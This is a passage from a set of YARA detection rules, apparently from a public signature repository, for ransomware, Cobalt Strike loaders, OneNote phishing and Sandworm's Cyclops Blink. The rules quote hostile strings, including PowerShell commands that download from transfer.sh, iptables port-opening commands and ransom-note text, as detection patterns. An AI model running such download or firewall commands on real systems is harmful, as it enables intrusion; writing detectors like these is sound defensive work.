		tags = "SCRIPT"

	strings:
		$x1 = ".DownloadString('https://transfer.sh"
		$x2 = ".DownloadString(\"https://transfer.sh"
		$x3 = "Invoke-WebRequest -Uri 'https://transfer.sh"
		$x4 = "Invoke-WebRequest -Uri \"https://transfer.sh"

	condition:
		1 of them
}
rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lockbit_Ransomnote_Feb24
{
	meta:
		description = "Detects the LockBit ransom note file 'LockBit-DECRYPT.txt' which is a sign of a LockBit ransomware infection"
		author = "Florian Roth"
		id = "b2fcb2a7-49e8-520c-944f-6acd5ded579b"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L137-L149"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "1fe07c33de1971b1f9430851dec4b8cd9f3ac7f087f0de18a2da4a390891b674"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = ">>>> Your personal DECRYPTION ID:"

	condition:
		1 of them
}
rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lazy_Ransomnote_Feb24
{
	meta:
		description = "Detects the Lazy ransom note file 'HowToRestoreYourFiles.txt' which is a sign of a Lazy ransomware infection"
		author = "Florian Roth"
		id = "287dfd67-8d0d-5906-b593-3af42a5a3aa4"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L151-L163"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c9416d05f0bd9aab9d6108380c1b5364f4c4e112b6e0726202f083eaacfdcf56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "All Encrypted files can be reversed to original form and become usable"

	condition:
		1 of them
}
rule SIGNATURE_BASE_SUSP_MAL_Signingcert_Feb24_1 : CVE_2024_1708 CVE_2024_1709 FILE
{
	meta:
		description = "Detects PE files signed with a certificate used to sign malware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709"
		author = "Florian Roth"
		id = "f25ea77a-1b4e-5c13-9117-eedf0c20335a"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L166-L184"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "37a39fc1feb4b14354c4d4b279ba77ba51e0d413f88e6ab991aad5dd6a9c231b"
		hash = "e8c48250cf7293c95d9af1fb830bb8a5aaf9cfb192d8697d2da729867935c793"
		logic_hash = "824efe1fa441322d891805df9a1637ebb44d18889572604acc125bf79a2d1083"
		score = 75
		quality = 85
		tags = "CVE-2024-1708, CVE-2024-1709, FILE"

	strings:
		$s1 = "Wisdom Promise Security Technology Co." ascii
		$s2 = "Globalsign TSA for CodeSign1" ascii
		$s3 = { 5D AC 0B 6C 02 5A 4B 21 89 4B A3 C2 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 70000KB and all of them
}

rule SIGNATURE_BASE_MAL_CS_Loader_Feb24_1 : CVE_2024_1708 CVE_2024_1709 FILE
{
	meta:
		description = "Detects Cobalt Strike malware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709"
		author = "Florian Roth"
		id = "6c9914a4-b079-5a39-9d3b-7b9a2b54dc2b"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L186-L206"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0a492d89ea2c05b1724a58dd05b7c4751e1ffdd2eab3a2f6a7ebe65bf3fdd6fe"
		logic_hash = "ae0e25c2dda1b727978977c674e834cd659661c597d88395a6f46ad5a179e9f0"
		score = 75
		quality = 85
		tags = "CVE-2024-1708, CVE-2024-1709, FILE"

	strings:
		$s1 = "Dll_x86.dll" ascii fullword

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.exports ( "UpdateSystem" ) and ( pe.imphash ( ) == "0dc05c4c21a86d29f1c3bf9cc5b712e0" or $s1 ) )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Indicators_Feb24 : CVE_2024_1708 CVE_2024_1709 FILE
{
	meta:
		description = "Detects Lockbit ransomware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709"
		author = "Florian Roth"
		id = "108430c8-4fe5-58a1-b709-539b257c120c"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L208-L228"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "a50d9954c0a50e5804065a8165b18571048160200249766bfa2f75d03c8cb6d0"
		logic_hash = "e4cd6b1a1bc57bf25c71f6bc228f45e4a996f9d9d391aeb3dda9c7d7857610bc"
		score = 75
		quality = 85
		tags = "CVE-2024-1708, CVE-2024-1709, FILE"

	strings:
		$op1 = { 76 c1 95 8b 18 00 93 56 bf 2b 88 71 4c 34 af b1 a5 e9 77 46 c3 13 }
		$op2 = { e0 02 10 f7 ac 75 0e 18 1b c2 c1 98 ac 46 }
		$op3 = { 8b c6 ab 53 ff 15 e4 57 42 00 ff 45 fc eb 92 ff 75 f8 ff 15 f4 57 42 00 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "914685b69f2ac2ff61b6b0f1883a054d" or 2 of them ) or all of them
}
rule SIGNATURE_BASE_MAL_MSI_Mpyutils_Feb24_1 : CVE_2024_1708 CVE_2024_1709 FILE
{
	meta:
		description = "Detects malicious MSI package mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709"
		author = "Florian Roth"
		id = "e7794336-a325-5b92-8c25-81ed9cb28044"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L230-L247"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "8e51de4774d27ad31a83d5df060ba008148665ab9caf6bc889a5e3fba4d7e600"
		logic_hash = "ba20db486e5d3c29c9702e10628fb3c0e55e52bbec74e3a86ed6511a6475b82f"
		score = 70
		quality = 85
		tags = "CVE-2024-1708, CVE-2024-1709, FILE"

	strings:
		$s1 = "crypt64ult.exe" ascii fullword
		$s2 = "EXPAND.EXE" wide fullword
		$s6 = "ICACLS.EXE" wide fullword

	condition:
		uint16( 0 ) == 0xcfd0 and filesize < 20000KB and all of them
}
rule SIGNATURE_BASE_MAL_Beacon_Unknown_Feb24_1 : CVE_2024_1708 CVE_2024_1709 FILE
{
	meta:
		description = "Detects malware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709 "
		author = "Florian Roth"
		id = "9299fd44-5327-5a73-8299-108b710cb16e"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L249-L268"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "6e8f83c88a66116e1a7eb10549542890d1910aee0000e3e70f6307aae21f9090"
		hash = "b0adf3d58fa354dbaac6a2047b6e30bc07a5460f71db5f5975ba7b96de986243"
		hash = "c0f7970bed203a5f8b2eca8929b4e80ba5c3276206da38c4e0a4445f648f3cec"
		logic_hash = "fd6ebc6676d677d6bc19398026eee7b7d2f9727ba7a3c79d1e970a6dc19548aa"
		score = 75
		quality = 85
		tags = "CVE-2024-1708, CVE-2024-1709, FILE"

	strings:
		$s1 = "Driver.dll" wide fullword
		$s2 = "X l.dlT" ascii fullword
		$s3 = "$928c7481-dd27-8e23-f829-4819aefc728c" ascii fullword

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 2000KB and 3 of ( $s* )
}
rule SIGNATURE_BASE_MAL_Gozicrypter_Dec20_1 : FILE
{
	meta:
		description = "Detects crypter associated with several Gozi samples"
		author = "James Quinn"
		id = "d4a48612-fa6f-5f03-8d27-5f6b79b2a070"
		date = "2020-12-02"
		modified = "2023-12-05"
		reference = "YaraExchange"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_gozi_crypter.yar#L2-L13"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "51fdfbb59b8f52cc2ff89d994c0f89d2c2895c346b098879c68b4ccb880783c1"
		score = 70
		quality = 85
		tags = "FILE"

	strings:
		$s1 = { 89 05 ?? ?? ?? ?? 81 2d ?? ?? ?? ?? 01 00 00 00 81 3D ?? ?? ?? ?? 00 00 00 00 }

	condition:
		uint16( 0 ) == 0x5A4D and any of them and filesize < 1000KB
}
rule SIGNATURE_BASE_SUSP_Email_Suspicious_Onenote_Attachment_Jan23_1 : FILE
{
	meta:
		description = "Detects suspicious OneNote attachment that embeds suspicious payload, e.g. an executable (FPs possible if the PE is attached separately)"
		author = "Florian Roth (Nextron Systems)"
		id = "492b74c2-3b81-5dff-9244-8528565338c6"
		date = "2023-01-27"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_onenote_phish.yar#L2-L39"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c7c5fc86f1dbe54da2d3ff8f039c5e53c3d1f67c9271cb467b2318310f744f93"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$ge1 = "5xbjvWUmEUWkxI1NC3qer"
		$ge2 = "cW471lJhFFpMSNTQt6nq"
		$ge3 = "nFuO9ZSYRRaTEjU0Lep6s"
		$sp1 = "VGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZG"
		$sp2 = "RoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl"
		$sp3 = "UaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZ"
		$sp4 = "VGhpcyBwcm9ncmFtIG11c3QgYmUgcnVuIHVuZGVy"
		$sp5 = "RoaXMgcHJvZ3JhbSBtdXN0IGJlIHJ1biB1bmRlc"
		$sp6 = "UaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZX"
		$se1 = "QGVjaG8gb2Zm"
		$se2 = "BlY2hvIG9mZ"
		$se3 = "AZWNobyBvZm"
		$se4 = "PEhUQTpBUFBMSUNBVElPTi"
		$se5 = "xIVEE6QVBQTElDQVRJT04g"
		$se6 = "8SFRBOkFQUExJQ0FUSU9OI"
		$se7 = "TAAAAAEUAg"
		$se8 = "wAAAABFAIA"
		$se9 = "MAAAAARQCA"

	condition:
		filesize < 5MB and 1 of ( $ge* ) and 1 of ( $s* )
}
rule SIGNATURE_BASE_SUSP_Email_Suspicious_Onenote_Attachment_Jan23_2 : FILE
{
	meta:
		description = "Detects suspicious OneNote attachment that has a file name often used in phishing attacks"
		author = "Florian Roth (Nextron Systems)"
		id = "f8c58c73-2404-5ce6-8e8f-99b0dad84ad0"
		date = "2023-01-27"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_onenote_phish.yar#L41-L61"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "eb6f992ce186022f04613af3bf4df629b00d85eac151f8bbd4b8ef96e6892eab"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$hc1 = { 2E 6F 6E 65 22 0D 0A 0D 0A 35 46 4A 63 65 }
		$x01 = " attachment; filename=\"Invoice" nocase
		$x02 = " attachment; filename=\"ORDER" nocase
		$x03 = " attachment; filename=\"PURCHASE" nocase
		$x04 = " attachment; filename=\"SHIP" nocase

	condition:
		filesize < 5MB and $hc1 and 1 of ( $x* )
}
rule SIGNATURE_BASE_SUSP_Onenote_Embedded_Filedatastoreobject_Type_Jan23_1 : FILE
{
	meta:
		description = "Detects suspicious embedded file types in OneNote files"
		author = "Florian Roth"
		id = "b8ea8c7b-052f-5a97-9577-99903462ea84"
		date = "2023-01-27"
		modified = "2023-02-27"
		reference = "https://blog.didierstevens.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_onenote_phish.yar#L63-L106"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d91ca297ea96f80534085f174d335ffe961c569534f043c5c2ae8d6a9f7ac083"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$x1 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac 
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? 4d 5a }
		$x2 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac 
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? [0-4] 40 65 63 68 6f }
		$x3 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac 
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? [0-4] 40 45 43 48 4f }
		$x4 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac 
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? [0-4] 4F 6E 20 45 }
		$x5 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac 
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? [0-4] 6F 6E 20 65 }
		$x6 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? 4c 00 00 00 }
		$x7 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? 49 54 53 46 }
		$x8 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? [6-200] 3C 68 74 61 3A }
		$x9 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? [6-200] 3C 48 54 41 3A }
		$x10 = { e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac
              ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??
              ?? ?? ?? ?? [6-200] 3C 6A 6F 62 20 }

	condition:
		filesize < 10MB and 1 of them
}
rule SIGNATURE_BASE_SUSP_Onenote_Embedded_Filedatastoreobject_Type_Jan23_2 : FILE
{
	meta:
		description = "Detects suspicious embedded file types in OneNote files"
		author = "Florian Roth (Nextron Systems)"
		id = "0664d202-ab4c-57b6-91ee-ea21ac08909e"
		date = "2023-01-27"
		modified = "2023-12-05"
		reference = "https://blog.didierstevens.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_onenote_phish.yar#L108-L125"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "bc07598570b6d4ebc5d14cedfed146c1ad309b8890bc0b9ee5f9ad645c1352e2"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$a1 = { 00 e7 16 e3 bd 65 26 11 45 a4 c4 8d 4d 0b 7a 9e ac }
		$s1 = "<HTA:APPLICATION "

	condition:
		filesize < 5MB and $a1 and 1 of ( $s* )
}
rule SIGNATURE_BASE_APT_Sandworm_Cyclopsblink_Notable_Strings : FILE
{
	meta:
		description = "Detects notable strings identified within the Cyclops Blink executable"
		author = "NCSC"
		id = "81ccf582-41f5-5fe5-8afc-e008e01289ff"
		date = "2022-02-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sandworm_cyclops_blink.yar#L6-L37"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
		hash = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
		logic_hash = "fdd3a1de9d178370fcc66dbca4628d7bedfbc002bca9e463e11cb444302900ea"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$proc_name1 = "[kworker/0:1]"
		$proc_name2 = "[kworker/1:1]"
		$dns_query = "POST /dns-query HTTP/1.1\x0d\x0aHost: dns.google\x0d\x0a"
		$iptables1 = "iptables -I %s -p tcp --dport %d -j ACCEPT &>/dev/null"
		$iptables2 = "iptables -D %s -p tcp --dport %d -j ACCEPT &>/dev/null"
		$sys_recon1 = "{\"ver\":\"%x\",\"mods\";["
		$sys_recon2 = "uptime: %lu mem_size: %lu mem_free: %lu"
		$sys_recon3 = "disk_size: %lu disk_free: %lu"
		$sys_recon4 = "hw: %02x:%02x:%02x:%02x:%02x:%02x"
		$testpath = "%s/214688dsf46"
		$confpath = "%s/rootfs_cfg"
		$downpath = "/var/tmp/a.tmp"

	condition:
		( uint32( 0 ) == 0x464c457f ) and ( 8 of them )
}
rule SIGNATURE_BASE_APT_Sandworm_Cyclopsblink_Module_Initialisation : FILE
{
	meta:
		description = "Detects the code bytes used to initialise the modules built into Cyclops Blink"
		author = "NCSC"
		id = "c81b92c4-3f70-5bbd-acfa-ed1e1d33461d"
		date = "2022-02-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sandworm_cyclops_blink.yar#L39-L55"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
		hash = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
		logic_hash = "8bde37f642cf07e323beabaacd5c62f8422b451777fc1fc4a6bdf474db49de12"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$ = {94 21 FF F0 93 E1 00 08 7C 3F 0B 78 38 00 00 ?? 7C 03
      03 78 81 61 00 00 8E EB FF F8 7D 61 5B 78 4E 80 00 20}

	condition:
		( uint32( 0 ) == 0x464c457f ) and ( any of them )
}
rule SIGNATURE_BASE_APT_Sandworm_Cyclopsblink_Modified_Install_Upgrade : FILE
{
	meta:
		description = "Detects notable strings identified within the modified install_upgrade executable, embedded within Cyclops Blink"
		author = "NCSC"
		id = "4c4f7262-df74-5f6a-afc0-df1fcae4741c"
		date = "2022-02-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sandworm_cyclops_blink.yar#L57-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
		hash = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
		hash = "7d61c0dd0cd901221a9dff9df09bb90810754f10"
		hash = "438cd40caca70cafe5ca436b36ef7d3a6321e858"
		logic_hash = "69b89dbaf3e2661f376ff1be7c19e96c82bf84fd572fea422c109f8afdd1e5aa"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$ = "/pending/%010lu_%06d_%03d_p1"
		$ = "/pending/sysa_code_dir/test_%d_%d_%d_%d_%d_%d"
		$ = "etaonrishdlcupfm"
		$ = "/pending/WGUpgrade-dl.new"
		$ = "/pending/bin/install_upgraded"
		$ = {38 80 4C 00}
		$ = {38 80 4C 05}
		$ = {38 80 4C 04}
		$ = {3C 00 48 4D 60 00 41 43 90 09 00 00}

	condition:
		( uint32( 0 ) == 0x464c457f ) and ( 6 of them )
}
rule SIGNATURE_BASE_APT_Sandworm_Cyclopsblink_Config_Identifiers : FILE
{
	meta:
		description = "Detects the initial characters used to identify Cyclops Blink configuration data"
		author = "NCSC"
		id = "db5b3a4a-82c2-500a-88f6-340b3392eac8"
		date = "2022-02-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sandworm_cyclops_blink.yar#L106-L126"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
		hash = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
		logic_hash = "6fa39442d717a69dd6f31a4bb2e5865c3f16156ce24a2b419d95ed751bb0d8ee"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$ = {3C 00 3C 6B 60 00 3A 20 90 09 00 00}
		$ = {3C 00 3C 63 60 00 3A 20 90 09 00 00}
		$ = {3C 00 3C 73 60 00 3A 20 90 09 00 00}

	condition:
		( uint32( 0 ) == 0x464c457f ) and ( all of them )
}
rule SIGNATURE_BASE_APT_Sandworm_Cyclopsblink_Handle_Mod_0Xf_Command : FILE
{
	meta:
		description = "Detects the code bytes used to check module ID 0xf control flags and a format string used for file content upload"
		author = "NCSC"
		id = "36646b7a-389d-5fd9-88a1-e43e7224763a"
		date = "2022-02-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sandworm_cyclops_blink.yar#L128-L150"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
		hash = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
		logic_hash = "6e3eebe404c8cd24e1e16eb3c881b1eda78ba6b365bf89c2557329e6f89396ac"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$ = {54 00 06 3E 54 00 07 FE 54 00 06 3E 2F 80 00 00}
		$ = {54 00 06 3E 54 00 07 BC 2F 80 00 00}
		$ = {54 00 06 3E 54 00 07 7A 2F 80 00 00}
		$ = {54 00 06 3E 54 00 06 F6 2F 80 00 00}
		$ = "file:%s\n" fullword

	condition:
		( uint32( 0 ) == 0x464c457f ) and ( all of them )
}
rule SIGNATURE_BASE_APT_Sandworm_Cyclopsblink_Default_Config_Values : FILE
{
	meta:
		description = "Detects the code bytes used to set default Cyclops Blink configuration values"
		author = "NCSC"
		id = "04067609-1173-51f2-907f-2a236aae6c7c"
		date = "2022-02-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sandworm_cyclops_blink.yar#L152-L174"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
		hash = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
		logic_hash = "180993057c110c0c0327b673c6d6e251534012de51cf6475838691e0942a1aa8"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$ = {38 00 00 19 90 09 01 A4}
		$ = {3C 00 00 01 60 00 80 00 90 09 01 A8}
		$ = {38 00 40 00 90 09 01 AC}
		$ = {38 00 01 0B 90 09 01 B0}
		$ = {38 00 27 11 90 09 01 C0}

	condition:
		( uint32( 0 ) == 0x464c457f ) and ( 3 of them )
}
rule SIGNATURE_BASE_APT_Sandworm_Cyclopsblink_Handle_Mod_0X51_Command : FILE
{
	meta:
		description = "Detects the code bytes used to check commands sent to module ID 0x51 and notable strings relating to the Cyclops Blink update process"
		author = "NCSC"
		id = "a6800aed-27dc-5d01-b005-1eb4a62344a3"
		date = "2022-02-23"
		modified = "2023-12-05"
		reference = "https://www.ncsc.gov.uk/news/joint-advisory-shows-new-sandworm-malware-cyclops-blink-replaces-vpnfilter"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sandworm_cyclops_blink.yar#L176-L200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3adf9a59743bc5d8399f67cab5eb2daf28b9b863"
		hash = "c59bc17659daca1b1ce65b6af077f86a648ad8a8"
		logic_hash = "8a68f4a5f5b7a45819e9a198881aa41b75a65181b63788c8b824b339bfd6fc67"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$cmd_check = {88 1F [2] 54 00 06 3E 2F 80 00 (01|02|03) }
		$path1 = "/etc/wg/configd-hash.xml"
		$path2 = "/etc/wg/config.xml"
		$mnt_arg1 = "ext2"
		$mnt_arg2 = "errors=continue"
		$mnt_arg3 = {38 C0 0C 20}
		$mnt_arg4 = {38 C0 0C 21}

	condition:
		( uint32( 0 ) == 0x464c457f ) and ( #cmd_check == 3 ) and ( ( @cmd_check [ 3 ] - @cmd_check [ 1 ] ) < 0x200 ) and ( all of ( $path* ) ) and ( all of ( $mnt_arg* ) )
}
rule SIGNATURE_BASE_MAL_Shellcode_Loader_Apr23
{
	meta:
		description = "Detects Shellcode loader as seen being used by Gopuram backdoor"
		author = "X__Junior (Nextron Systems)"
		id = "363b67d6-9cac-513d-a545-1f256667bab8"
		date = "2023-04-03"
		modified = "2023-12-05"
		reference = "https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_mal_gopuram_apr23.yar#L3-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "6ce5b6b4cdd6290d396465a1624d489c7afd2259a4d69b73c6b0ba0e5ad4e4ad"
		hash = "b56279136d816a11cf4db9fc1b249da04b3fa3aef4ba709b20cdfbe572394812"
		logic_hash = "e4e423158757c80b5e4e77f6a343323a87798c6697cf6a832aa01a146712b250"
		score = 80
		quality = 85
		tags = ""

	strings:
		$op1 = { 41 C1 CB 0D 0F BE 03 48 FF C3 44 03 D8 80 7B ?? 00 75 ?? 41 8D 04 13 3B C6 74 }
